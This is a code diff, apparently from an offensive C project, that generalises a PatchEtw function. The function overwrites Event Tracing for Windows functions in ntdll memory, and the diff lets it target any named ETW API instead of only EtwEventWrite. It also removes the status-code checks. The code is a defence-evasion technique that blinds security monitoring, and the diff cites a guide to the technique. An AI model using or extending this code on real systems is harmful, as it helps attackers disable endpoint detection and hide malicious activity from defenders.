@@ -2,7 +2,10 @@
 
 // https://deepwiki.com/nullsection/SharpETW-Patch/3-etw-patching-technique
 
-BOOL PatchEtw()
+BOOL PatchEtw
+(
+	IN LPCSTR EtwApi
+)
 {
 
 	DWORD dwOldProt = 0;
@@ -23,17 +26,14 @@ BOOL PatchEtw()
 
 	INFO("[0x%p] Current Ntdll Handle", ntdll);
 
-	pEtwFunc = GetProcAddress(ntdll, "EtwEventWrite");
+	pEtwFunc = GetProcAddress(ntdll, EtwApi);
 	if (pEtwFunc == NULL)
 	{
 		PRINT_ERROR("GetProcAddress");
 		return FALSE;
 	}
 
-	INFO("[0x%p] EtwEventWrite", pEtwFunc);
-
-	status = ((pEtwEventWrite)pEtwFunc)(NULL, NULL, 0, NULL); // Testing to see current status code
-	INFO("EtwEventWrite Status: 0x%lx", status); // return 0x57
+	INFO("[0x%p] %s Handle", pEtwFunc, EtwApi);
 
 	INFO("Original Bytes...");
 	for (SIZE_T i = 0; i < sizeof(patch); i++)
@@ -75,9 +75,6 @@ BOOL PatchEtw()
 		PRINT_ERROR("FlushInstructionCache");
 		return FALSE;
 	}
-
-	status = ((pEtwEventWrite)pEtwFunc)(NULL, NULL, 0, NULL); // Testing to ensure it returns 0x0
-	INFO("EtwEventWrite Status: 0x%lx", status); // return 0x0
 
 	INFO("CPU Instructions Flushed!");
 	OKAY("DONE!");
